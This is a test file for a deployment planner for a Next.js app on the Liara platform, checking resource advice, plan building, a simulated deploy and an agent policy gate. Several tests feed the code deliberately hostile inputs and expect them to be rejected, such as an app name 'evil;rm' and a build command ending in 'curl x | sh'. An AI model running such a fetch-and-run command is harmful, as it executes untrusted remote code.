import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { analyzeSource } from "@/server/deploy/analyze";
import { DeployParams } from "@/server/deploy/params";
import { buildPlan, deployFingerprint, stepsFor } from "@/server/deploy/plan";
import { buildReadiness } from "@/server/deploy/readiness";
import { recommend, type PlanCatalogue } from "@/server/deploy/recommend";
import { DEPLOY_SIM_NOTE, simulateDeployment } from "@/server/deploy/simulator";
import { FIRST_DEPLOY_STRATEGY, GITHUB_ACTIONS_NOTE, strategySummary } from "@/server/deploy/strategy";
import { NO_DECISIONS, type SourceAnalysis } from "@/server/deploy/types";
import { withProject } from "@/server/deploy/workspace";
import { SIM_SCENARIOS, type SimScenario } from "@/server/deploy/params";
import { evaluateProposal, proposalDigest, contentOf } from "@/server/agent/policy";
import { baseFiles, withPkg, zipOf, type Files } from "../helpers/projects";

const analyze = (over: Files = {}): Promise<SourceAnalysis> => withProject(zipOf({ ...baseFiles(), ...over }), (t, s) => analyzeSource(t, s));

describe("resource recommendation", () => {
  it("is labelled PRELIMINARY, never names a plan id or a price without a verified catalogue", async () => {
    const rec = recommend({ analysis: await analyze() });
    expect(rec.labelFa).toMatch(/تأییدنشده/);
    expect(rec.liaraPlan).toBeNull();
    expect(rec.catalogueUsed).toBe(false);
    expect(rec.pricingFa).toMatch(/نمایش داده نمی‌شود/);
    expect(JSON.stringify(rec)).not.toMatch(/تومان|ریال|\$\d|USD|price"\s*:\s*\d/);
  });
  it("traffic raises the memory guidance; unknown traffic is stated as missing information", async () => {
    const a = await analyze();
    const [u, l, m, h] = (["unknown", "low", "medium", "high"] as const).map((t) => recommend({ analysis: a, traffic: t }));
    expect(h!.resources.ramMbRecommended).toBeGreaterThan(m!.resources.ramMbRecommended);
    expect(m!.resources.ramMbRecommended).toBeGreaterThan(u!.resources.ramMbRecommended);
    expect(l!.resources.ramMbRecommended).toBeLessThanOrEqual(u!.resources.ramMbRecommended);
    expect(u!.missingInformationFa.join(" ")).toMatch(/ترافیک/);
    expect(h!.category).not.toBe("starter");
  });
  it("static export recommends static hosting with far smaller resources", async () => {
    const rec = recommend({ analysis: await analyze({ "next.config.js": "module.exports = { output: 'export' }" }) });
    expect(rec.approach).toMatchObject({ id: "static_export", platformCandidate: "static" });
    expect(rec.resources.ramMbRecommended).toBeLessThan(512);
  });
  it("a database, file storage, background work and prisma each change the output and are explained", async () => {
    const base = recommend({ analysis: await analyze() });
    const prisma = recommend({ analysis: await analyze(withPkg((p) => ((p.dependencies as Record<string, string>)["@prisma/client"] = "5"))) });
    expect(prisma.resources.ramMbRecommended).toBeGreaterThan(base.resources.ramMbRecommended);
    expect(prisma.manualStepsFa.join(" ")).toMatch(/پایگاه‌داده/);
    const sqlite = recommend({ analysis: await analyze(withPkg((p) => ((p.dependencies as Record<string, string>)["better-sqlite3"] = "9"))) });
    expect(sqlite.resources.diskGb).toBe(1);
    expect(sqlite.reasoning.map((r) => r.factor)).toContain("storage");
    const bg = recommend({ analysis: await analyze(withPkg((p) => ((p.dependencies as Record<string, string>)["node-cron"] = "3"))) });
    expect(bg.tradeoffsFa.join(" ")).toMatch(/پس‌زمینه/);
    expect(recommend({ analysis: await analyze(), needsBackgroundWorker: true }).reasoning.some((r) => r.factor === "background")).toBe(true);
  });
  it("user resource constraints are respected and conflicts are stated", async () => {
    const a = await analyze();
    const tight = recommend({ analysis: a, constraints: { maxRamMb: 256 } });
    expect(tight.tradeoffsFa.join(" ")).toMatch(/کمتر از حداقل/);
    const mid = recommend({ analysis: a, traffic: "medium", constraints: { maxRamMb: 1024 } });
    expect(mid.resources.ramMbRecommended).toBe(1024);
  });
  it("every recommendation carries reasoning, trade-offs/missing info and a manual step about charging", async () => {
    const rec = recommend({ analysis: await analyze() });
    expect(rec.reasoning.length).toBeGreaterThan(1);
    expect(rec.missingInformationFa.length).toBeGreaterThan(0);
    expect(rec.manualStepsFa.join(" ")).toMatch(/شارژ حساب/);
  });
  describe("catalogue gate", () => {
    const plans = [{ id: "p-a", ramMb: 512, cpu: 1, diskGb: null, priceMonthly: 10, available: true }, { id: "p-b", ramMb: 1024, cpu: 1, diskGb: null, priceMonthly: 20, available: true }, { id: "p-c", ramMb: 2048, cpu: 2, diskGb: null, priceMonthly: 40, available: false }];
    const cat = (over: Partial<PlanCatalogue>): PlanCatalogue => ({ verified: true, unitsVerified: true, priceUnitVerified: true, plans, ...over });
    it("an unverified catalogue is ignored entirely", async () => {
      const a = await analyze();
      for (const c of [cat({ verified: false }), cat({ unitsVerified: false }), null, undefined]) expect(recommend({ analysis: a, catalogue: c }).liaraPlan).toBeNull();
    });
    it("a verified catalogue yields an id; the price appears only when ITS unit is verified too", async () => {
      const a = await analyze();
      const withPrice = recommend({ analysis: a, catalogue: cat({}) });
      expect(withPrice.liaraPlan).toMatchObject({ id: "p-b", priceMonthly: 20 });
      expect(withPrice.labelFa).toMatch(/کاتالوگ تأییدشده/);
      const noPrice = recommend({ analysis: a, catalogue: cat({ priceUnitVerified: false }) });
      expect(noPrice.liaraPlan).toMatchObject({ id: "p-b", priceMonthly: null });
      expect(noPrice.pricingFa).toMatch(/واحد قیمت تأیید نشده/);
    });
    it("unavailable plans are never recommended", async () => {
      const r = recommend({ analysis: await analyze(), traffic: "medium", catalogue: cat({}) });
      expect(r.liaraPlan).toBeNull();
      expect(r.tradeoffsFa.join(" ")).toMatch(/در دسترس نبود/);
    });
  });
});

describe("deployment plan", () => {
  const plan = async (over: Files = {}, decisions = NO_DECISIONS, opts = {}) => {
    const a = await analyze(over);
    const r = buildReadiness(a, decisions);
    return { a, r, out: buildPlan(a, r, recommend({ analysis: a }), opts) };
  };
  it("builds a strict, simulation-scoped, secret-free plan from a ready project", async () => {
    const { a, out } = await plan();
    expect(out.ok).toBe(true);
    if (!out.ok) return;
    const p = out.plan.params;
    expect(DeployParams.safeParse(p).success).toBe(true);
    expect(p).toMatchObject({ framework: "next", environment: "simulation", artifactDigest: a.project.artifactDigest32, platform: "next", appName: "my-shop-site", readinessBasis: "READY", teamId: null });
    expect(p.build).toMatchObject({ buildInvocation: "npm run build", startInvocation: "npm start", port: 3000 });
    expect(p.steps).toEqual(stepsFor("next"));
    expect(out.plan.preconditionsFa.join(" ")).toMatch(/شارژ حساب/);
  });
  it("carries env NAMES only — never values", async () => {
    const { out } = await plan({ ".env.example": "API_KEY=sk_live_abcdefghijklmnopqrstuvwxyz\nDB_URL=postgres://u:pw@h/db\n", ".env": "REAL=hunter2hunter2" }, { ...NO_DECISIONS, envConfirmed: true });
    expect(out.ok).toBe(true);
    if (!out.ok) return;
    expect(out.plan.params.envKeys).toEqual(["API_KEY", "DB_URL"]);
    expect(out.plan.params.readinessBasis).toBe("NEEDS_CONFIGURATION_CONFIRMED");
    expect(JSON.stringify(out.plan)).not.toMatch(/sk_live|hunter2|postgres:\/\/|pw@/);
  });
  it("refuses (never half-plans) for every verdict that forbids it", async () => {
    expect((await plan({ "package.json": JSON.stringify({ dependencies: { nuxt: "3" } }) })).out).toMatchObject({ ok: false, refusal: "not_supported" });
    expect((await plan(withPkg((p) => delete (p.scripts as Record<string, string>).start))).out).toMatchObject({ ok: false, refusal: "blocked" });
    expect((await plan({ ".env.example": "A_KEY=\n" })).out).toMatchObject({ ok: false, refusal: "needs_configuration" });
  });
  it("rejects invalid app names", async () => {
    for (const appName of ["A", "Has Space", "-bad-", "x".repeat(60), "../etc", "evil;rm", "UPPER_case"]) expect((await plan({}, NO_DECISIONS, { appName })).out, appName).toMatchObject({ ok: false, refusal: "invalid_app_name" });
  });
  it("a static export plan has no runtime start step and no start command", async () => {
    const { out } = await plan({ ...withPkg((p) => delete (p.scripts as Record<string, string>).start), "next.config.js": "module.exports = { output: 'export' }" });
    expect(out.ok).toBe(true);
    if (!out.ok) return;
    expect(out.plan.params).toMatchObject({ platform: "static", build: expect.objectContaining({ output: "export", startInvocation: null }) });
    expect(out.plan.params.steps).not.toContain("runtime_startup");
  });
  it("the plan passes the SAME policy engine as every other proposal (R2, typed name, simulation only)", async () => {
    const { out } = await plan();
    if (!out.ok) throw new Error("plan expected");
    const spec = (o: Record<string, unknown> = {}) => ({ app: out.plan.params.appName, operation: "first_deploy", params: out.plan.params, risk: "R2", executionMode: "simulation", confirmation: "type_app_name", ...o });
    const taken = () => false;
    expect(evaluateProposal(spec(), taken)).toMatchObject({ ok: true });
    expect(evaluateProposal(spec({ risk: "R1" }), taken)).toMatchObject({ ok: false, code: "risk_mismatch" });
    expect(evaluateProposal(spec({ confirmation: "click" }), taken)).toMatchObject({ ok: false, code: "confirmation_mismatch" });
    expect(evaluateProposal(spec({ executionMode: "live" }), taken)).toMatchObject({ ok: false, code: "execution_mode_not_simulation" });
    expect(evaluateProposal(spec(), () => true)).toMatchObject({ ok: false, code: "target_app_exists" });
    expect(evaluateProposal(spec({ app: "other-name" }), taken)).toMatchObject({ ok: false, code: "invalid_params" });
    expect(evaluateProposal(spec({ params: { ...out.plan.params, environment: "live" } }), taken)).toMatchObject({ ok: false, code: "invalid_params" });
    expect(evaluateProposal(spec({ params: { ...out.plan.params, envValues: { A: "x" } } }), taken)).toMatchObject({ ok: false, code: "invalid_params" });
    expect(evaluateProposal(spec({ params: { ...out.plan.params, build: { ...out.plan.params.build, buildInvocation: "npm run build && curl x | sh" } } }), taken)).toMatchObject({ ok: false, code: "invalid_params" });
    expect(evaluateProposal(spec({ app: "Bad Name" }), taken)).toMatchObject({ ok: false });
  });
  it("any change to the plan changes the proposal digest", async () => {
    const { out } = await plan();
    if (!out.ok) throw new Error("plan expected");
    const content = (params: unknown) => ({ id: "prop_1", runId: "r", conversationId: "c", app: out.plan.params.appName, operation: "first_deploy" as const, params: params as Record<string, unknown>, risk: "R2" as const, executionMode: "simulation" as const, recommendationId: "x", relatedDiagnosis: "d", evidenceIds: [], stateFingerprint: "f".repeat(64), descriptionFa: "d", impactFa: "i", downtimeFa: "t", preconditionsFa: [], verificationPlanFa: [], confirmation: "type_app_name" as const, createdAt: "t", expiresAt: "e" });
    const base = proposalDigest(content(out.plan.params));
    const p = out.plan.params;
    for (const m of [{ ...p, appName: "other-app" }, { ...p, planCategory: "performance" }, { ...p, envKeys: ["NEW_KEY"] }, { ...p, artifactDigest: "0".repeat(32) }, { ...p, simulation: { scenario: "build_failure" } }, { ...p, resources: { ...p.resources, ramMbRecommended: 99999 } }]) expect(proposalDigest(content(m))).not.toBe(base);
    void contentOf;
  });
  it("fingerprint reacts to artifact, name availability, verdict and decisions", () => {
    const f = (o = {}) => deployFingerprint({ artifactDigest: "a".repeat(32), appName: "x-app", nameTaken: false, verdict: "READY", decisions: { env: false }, ...o });
    const base = f();
    expect(f()).toBe(base);
    for (const o of [{ artifactDigest: "b".repeat(32) }, { appName: "y-app" }, { nameTaken: true }, { verdict: "BLOCKED" }, { decisions: { env: true } }]) expect(f(o)).not.toBe(base);
  });
});

describe("deployment simulator", () => {
  const params = async (scenario: SimScenario = "success", over: Files = {}) => {
    const a = await analyze(over);
    const out = buildPlan(a, buildReadiness(a), recommend({ analysis: a }), { scenario });
    if (!out.ok) throw new Error("plan expected");
    return out.plan.params;
  };
  it("success completes every stage with simulated labels, no URL and no release id", async () => {
    const r = simulateDeployment({ id: "prop_1", app: "my-shop-site", params: await params() }, "2026-01-01T00:00:00.000Z");
    expect(r).toMatchObject({ simulated: true, operation: "first_deploy", outcome: "succeeded", noteFa: DEPLOY_SIM_NOTE });
    expect(r.deployment.reached).toBe("completed");
    expect(r.deployment.stages.every((s) => s.status === "ok")).toBe(true);
    const json = JSON.stringify(r);
    expect(json).not.toMatch(/https?:\/\//);
    expect(json).not.toMatch(/\.liara\.(run|ir|app)/);
    expect(json).not.toMatch(/rel_|release[-_ ]?id\s*[:=]\s*\w/i);
    for (const s of r.deployment.stages) expect(s.labelFa).toMatch(/ساختگی/);
    expect(r.deployment.urlNoteFa).toMatch(/شبیه‌سازی/);
    expect(r.deployment.releaseNoteFa).toMatch(/ساخته نمی‌شود/);
    expect(r.verification).toMatchObject({ outcome: "success" });
  });
  const failAt: Record<Exclude<SimScenario, "success">, string> = { insufficient_permissions: "create_app", missing_build_script: "validate_config", missing_config: "validate_config", build_failure: "build", startup_failure: "runtime_startup", health_failure: "health_check" };
  for (const [scenario, stage] of Object.entries(failAt)) {
    it(`${scenario} interrupts the workflow at ${stage}; later stages do not run`, async () => {
      const r = simulateDeployment({ id: "prop_1", app: "my-shop-site", params: await params(scenario as SimScenario) }, "t");
      expect(r.outcome).toBe("failed");
      expect(r.deployment).toMatchObject({ failedStage: stage, failureCode: scenario });
      const i = r.deployment.stages.findIndex((s) => s.id === stage);
      expect(r.deployment.stages.slice(0, i).every((s) => s.status === "ok")).toBe(true);
      expect(r.deployment.stages[i]!.status).toBe("failed");
      expect(r.deployment.stages.slice(i + 1).every((s) => s.status === "not_run")).toBe(true);
      expect(r.steps.at(-1)!.status).toBe("failed");
      expect(r.deployment.reached).toBe(stage === "health_check" ? "verification" : "running");
      expect(r.verification!.outcome).toBe(stage === "health_check" ? "failure" : "not_run");
      expect(JSON.stringify(r)).toMatch(/شبیه‌سازی/);
    });
  }
  it("a scenario whose stage is not in the plan (startup on a static plan) completes", async () => {
    const p = await params("startup_failure", { "next.config.js": "module.exports = { output: 'export' }" });
    expect(p.steps).not.toContain("runtime_startup");
    expect(simulateDeployment({ id: "p", app: "x-app", params: p }, "t").outcome).toBe("succeeded");
  });
  it("is deterministic", async () => {
    const p = await params("build_failure");
    expect(simulateDeployment({ id: "p", app: "x-app", params: p }, "t")).toEqual(simulateDeployment({ id: "p", app: "x-app", params: p }, "t"));
  });
  it("every scenario id is covered", () => {
    expect(SIM_SCENARIOS.length).toBe(7);
  });
  it("the deploy simulator module has no I/O and no Liara imports", () => {
    const src = readFileSync(path.resolve(__dirname, "../../src/server/deploy/simulator.ts"), "utf8");
    expect([...src.matchAll(/from\s+["']([^"']+)["']/g)].map((m) => m[1])).toEqual(["../agent/types", "./params"]);
    expect(src).not.toMatch(/\bfetch\s*\(|node:|process\.env|child_process|\brequire\(/);
  });
});

describe("Liara strategy (derived from the pinned evidence)", () => {
  const spec = readFileSync(path.resolve(__dirname, "../../docs/reference/openapi/paas.yaml"), "utf8").split("\n");
  const norm = (p: string) => p.replace(/\{[^}]+\}/g, "{}");
  const ops = new Set<string>();
  let cur = "";
  for (const line of spec) {
    const pm = /^ {2}'?(\/[^':\s]+)'?:\s*$/.exec(line);
    if (pm) cur = norm(pm[1]!);
    const mm = /^ {4}(get|post|put|delete|patch):/.exec(line);
    if (mm && cur) ops.add(`${mm[1]!.toUpperCase()} ${cur}`);
  }
  it("parsed the pinned OpenAPI operations", () => expect(ops.size).toBeGreaterThan(30));
  it("every API operation attributed to class A (documented) really exists in the pinned OpenAPI", () => {
    for (const s of FIRST_DEPLOY_STRATEGY.filter((x) => x.class === "A")) {
      for (const api of s.api.filter((x) => !/\(B\)|CLI/.test(x))) {
        const m = /^(GET|POST|PUT|DELETE) (\/\S+)/.exec(api);
        if (!m) continue;
        expect(ops.has(`${m[1]} ${norm(m[2]!)}`), `${s.id}: ${api}`).toBe(true);
      }
    }
  });
  it("operations marked (B)/CLI-only are NOT in the pinned OpenAPI (so they are never presented as documented)", () => {
    const b = FIRST_DEPLOY_STRATEGY.flatMap((s) => s.api.filter((x) => /\(B\)/.test(x)));
    expect(b.length).toBeGreaterThan(0);
    for (const api of b) {
      const m = /^(GET|POST) (\/\S+)/.exec(api)!;
      expect(ops.has(`${m[1]} ${norm(m[2]!)}`), api).toBe(false);
    }
  });
  it("covers the whole workflow, in order, with explicit manual and unverified steps", () => {
    expect(FIRST_DEPLOY_STRATEGY.map((s) => s.id)).toEqual(["select_team", "check_account", "choose_platform", "recommend_plan", "create_app", "configure_env", "prepare_artifact", "upload_source", "create_release", "track_build", "verify_startup", "domain_guidance", "post_checks"]);
    expect(FIRST_DEPLOY_STRATEGY.map((s) => s.order)).toEqual([...Array(13)].map((_, i) => i + 1));
    expect(strategySummary().byClass.A).toBeGreaterThan(3);
    expect(FIRST_DEPLOY_STRATEGY.filter((s) => s.class === "C" || s.class === "D").length).toBeGreaterThanOrEqual(3);
  });
  it("mutating steps are R2; reads are R0; and no step claims a capability the matrix says does not exist", () => {
    for (const s of FIRST_DEPLOY_STRATEGY) expect(s.risk).toBe(s.mutation ? "R2" : "R0");
    const text = JSON.stringify(FIRST_DEPLOY_STRATEGY);
    expect(text).not.toMatch(/rollback|بازگشت به نسخه|واریز|خرید خودکار/);
    expect(FIRST_DEPLOY_STRATEGY.find((s) => s.id === "check_account")!.class).not.toBe("A");
    expect(FIRST_DEPLOY_STRATEGY.find((s) => s.id === "recommend_plan")!.class).toBe("D");
  });
  it("GitHub Actions is described separately, as unverified and never executed", () => {
    expect(GITHUB_ACTIONS_NOTE).toMatchObject({ verified: false, executedHere: false });
    expect(GITHUB_ACTIONS_NOTE.detailFa).toMatch(/هیچ API برای «اتصال بومی GitHub» مستند یا تأیید نشده/);
    expect(JSON.stringify(FIRST_DEPLOY_STRATEGY)).not.toMatch(/github/i);
  });
  it("the strategy module performs no I/O", () => {
    const src = readFileSync(path.resolve(__dirname, "../../src/server/deploy/strategy.ts"), "utf8");
    expect(src).not.toMatch(/\bimport\b|\bfetch\s*\(|node:/);
  });
});
